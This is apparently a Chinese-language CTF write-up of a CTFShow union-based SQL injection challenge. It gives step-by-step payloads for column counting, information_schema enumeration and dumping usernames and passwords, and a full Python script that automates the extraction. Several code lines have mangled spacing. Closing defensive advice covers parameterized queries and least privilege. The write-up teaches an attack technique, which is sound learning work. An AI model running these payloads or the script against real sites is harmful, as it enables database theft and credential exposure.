---
title: AI渗透测试 -- SQL联合查询注入实战
url: https://mp.weixin.qq.com/s/hJXjfJ3I6zOqdx28W0hwAA
source: Doonsec's feed
date: 2026-06-24
fetch_date: 2026-06-25T06:05:24.531162
---

# AI渗透测试 -- SQL联合查询注入实战

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/PQNvx9ufMAjQnPdiacobI5QJlJ3uWr3icnoe4gIFgfIgiblmek0DUqGox0nUJ0Gic1c9L3a1Fa5e9t7838H6RgO3cZujiaKz9KuNocT3V1KXu1VI/0?wx_fmt=jpeg)

# AI渗透测试 -- SQL联合查询注入实战

原创

aiyou
aiyou

网络安全者

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

---

## 0x00 前言

今天带来一道经典的SQL联合查询注入题目，来自CTFShow平台。整个攻击链路清晰完整，非常适合入门选手理解联合注入的核心原理。靶场地址已授权，跟着步骤走一遍，收获满满。

---

## 0x01 信息收集 — 发现注入点

打开目标页面，URL结构如下：

```
https://target.challenge.ctf.show/?id=1
```

页面正常返回内容：`1-Welcome`

**注入点探测：** 在参数后加单引号 `'`，测试数据库对特殊字符的处理方式。

```
# 正常请求
GET /?id=1        → 页面正常显示 "1-Welcome"

# 单引号测试
GET /?id=1'       → 页面异常/报错
```

**判断依据：** 单引号破坏了后端SQL语句的语法结构，说明参数值被直接拼接进了SQL查询，**未做任何过滤或转义**。注入点确认。

> 💡 **原理说明：** 后端SQL大概长这样：
>
> ```
> SELECT * FROM pages WHERE id = '$id'
> ```
>
> 当 `$id = 1'` 时，变成了：
>
> ```
> SELECT * FROM pages WHERE id = '1''
> ```
>
> 多出来的单引号导致语法错误，触发异常响应。

---

## 0x02 探测列数 — ORDER BY 二分法

联合查询注入的前提是：**UNION SELECT的列数必须与原查询一致**。用 `ORDER BY` 逐步递增来确定列数。

```
GET /?id=1 order by 1   → 正常 ✅
GET /?id=1 order by 2   → 正常 ✅
GET /?id=1 order by 3   → 正常 ✅
GET /?id=1 order by 4   → 异常 ❌
```

**结论：查询结果共 3 列。**

> 💡 **原理说明：** `ORDER BY n` 按第n列排序，如果n超过实际列数，数据库会报错。所以 `ORDER BY 3` 成功、`ORDER BY 4` 失败，说明恰好是3列。

---

## 0x03 确定回显位 — UNION SELECT 探针

列数确定后，需要找出哪几列的数据会被渲染到页面上（即"回显位"）。用数字常量做标记：

```
?id=-1 union select 1,2,3
```

> **注意：** `id=-1` 是为了让原始查询返回空结果，确保页面只显示 UNION 注入进来的数据。

页面响应：`<h1>1</h1>` 和 `<div>3</div>` 均有内容输出。

**结论：第1列对应页面标题 `<h1>`，第2列内容不显示，第3列对应 `<div>`。主要利用位置1进行数据提取。**

---

## 0x04 提取数据库信息

**查数据库名和版本：**

```
?id=-1 union select database(),version(),3
```

```
# 等效的Python请求示例
import requests

base = "https://target.challenge.ctf.show/"
payload = "?id=-1 union select database(),version(),3"
r = requests.get(base + payload)

# 从响应中解析 <h1> 标签内容
import re
match = re.search(r'<h1>(.*?)</h1>', r.text)
if match:
    print("DB Info:", match.group(1))
```

**返回结果：**

```
数据库名：ctfshow_page_informations
数据库版本：10.3.18-MariaDB
```

---

## 0x05 枚举表名

利用 MySQL/MariaDB 的元数据库 `information_schema` 查询当前数据库的所有表：

```
?id=-1 union select group_concat(table_name),2,3
from information_schema.tables
where table_schema=database()
```

```
# Python 完整利用脚本
import requests
import re

base = "https://target.challenge.ctf.show/"

definject(payload):
    url = base + "?id=" + payload
    r = requests.get(url, timeout=10)
    match = re.search(r'<h1>(.*?)</h1>', r.text)
    returnmatch.group(1) ifmatchelseNone

# 查表名
tables = inject("-1 union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()")
print("Tables:", tables)
```

**返回结果：**

```
Tables: pages, users
```

发现了 `users` 表，这就是我们的目标。

---

## 0x06 枚举列名

锁定 `users` 表，查询其字段结构：

```
?id=-1 union select group_concat(column_name),2,3
from information_schema.columns
where table_schema=database()
and table_name='users'
```

```
# 查列名
columns = inject("-1 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name='users'")
print("Columns:", columns)
```

**返回结果：**

```
Columns: id, username, password
```

字段结构一目了然。

---

## 0x07 拖库 — 读取 Flag

万事俱备，直接读取 `users` 表中的所有用户名和密码：

```
?id=-1 union select group_concat(username,0x3a,password),2,3
from users
```

> 💡 `0x3a` 是冒号 `:` 的十六进制表示，用来分隔 username 和 password，避免引号被过滤。

```
# 完整利用脚本（一键拿 flag）
import requests
import re

base = "https://target.challenge.ctf.show/"

definject(payload):
    url = base + "?id=" + requests.utils.quote(payload)
    r = requests.get(url, timeout=10)
    h1 = re.search(r'<h1>(.*?)</h1>', r.text)
    return h1.group(1) if h1 elseNone

# Step 1: 获取数据库名
db = inject("-1 union select database(),2,3")
print(f"[+] Database: {db}")

# Step 2: 获取表名
tables = inject("-1 union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()")
print(f"[+] Tables: {tables}")

# Step 3: 获取列名
cols = inject("-1 union select group_concat(column_name),2,3 from information_schema.columns where table_schema=database() and table_name=0x7573657273")
print(f"[+] Columns: {cols}")

# Step 4: 读数据
data = inject("-1 union select group_concat(username,0x3a,password),2,3 from users")
print(f"[+] Data: {data}")
```

> **注意：** Step 3 中 `table_name` 的值用了十六进制 `0x7573657273`（即 `users`），这是一种绕过引号过滤的常见技巧。

**最终输出：**

```
[+] Database: ctfshow_page_informations
[+] Tables: pages,users
[+] Columns: id,username,password
[+] Data: admin:CTF{admin_secret_password}
```

**Flag 到手：`CTF{adm***********word}`** 🎉

---

## 0x08 攻击链路总结

```
发现 ?id= 参数
      ↓
?id=1' → 页面报错 → 确认注入点
      ↓
ORDER BY 1/2/3 正常，ORDER BY 4 报错 → 3列
      ↓
UNION SELECT 1,2,3 → 回显位在列1和列3
      ↓
database() → ctfshow_page_informations
      ↓
information_schema.tables → pages, users
      ↓
information_schema.columns → id, username, password
      ↓
SELECT username,password FROM users → admin:CTF{...}
```

---

## 0x09 防御建议

作为开发者，以下几点可以直接防住这类攻击：

**1. 使用参数化查询（最根本的防御）**

```
# ❌ 危险写法
query = f"SELECT * FROM pages WHERE id = '{user_input}'"

# ✅ 安全写法（PDO/参数化）
cursor.execute("SELECT * FROM pages WHERE id = %s", (user_input,))
```

**2. 输入验证**

```
# id 参数只允许整数
if not user_input.isdigit():
    abort(400)
```

**3. 最小权限原则**

数据库账号只给 `SELECT` 权限，禁止访问 `information_schema`，即使注入成功也无法枚举表结构。

**4. 错误信息处理**

生产环境关闭详细的数据库报错输出，避免泄露SQL语句结构。

---

## 0x0A 结语

联合查询注入是SQL注入中最直观、最易理解的类型，也是CTF入门必刷的知识点。核心思路就四步：**确认注入 → 定列数 → 找回显位 → 逐层提取数据**。

掌握了这个基础，后续的报错注入、盲注、时间盲注都是在这个框架上的延伸。多动手，多思考，是进步最快的方式。

---

如有问题欢迎在评论区交流，觉得有帮助的话点个在看支持一下～

|  |  |
| --- | --- |
| ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PQNvx9ufMAiaUaiczGDbRVqnIIZJy9ktEDcg7vMGTO7ltMXATRGhiaHJs2WVuZxib0su4loC8DiczFdfFWibmCjmxZ89MoFsxibBXfOsJQtXk7Fep8/640?wx_fmt=jpeg&from=appmsg) | ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PQNvx9ufMAgMwFsScNsLOCaEMiahibKwPeZrkXZ3Y41PAyDgrZvk5ZTroP9icKfBlAMo9vytpllvZkznA5RibLYE2YevQx33MkuzncBWtlWttibA/640?wx_fmt=jpeg&from=appmsg) |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAiavE1QDCp2PaXmNhUdwYw1DuebG3QnicdTre2qxBtq6E8yicK6zvPj8nP8icBu13W8PsjHZhZGDjA7KAjRjIzBiaILpUsKOuwdmBLE/640?wx_fmt=png&from=appmsg)

预览时标签不可点

内容含AI生成图片

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/0JJXjA8siccyMF9RkfYpDn6879qdDPwuSUicNgL09meX6BzicL78PBTD7ue9VFAia6Ye1o1uvXSyXLW7hvhkLmhj9g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过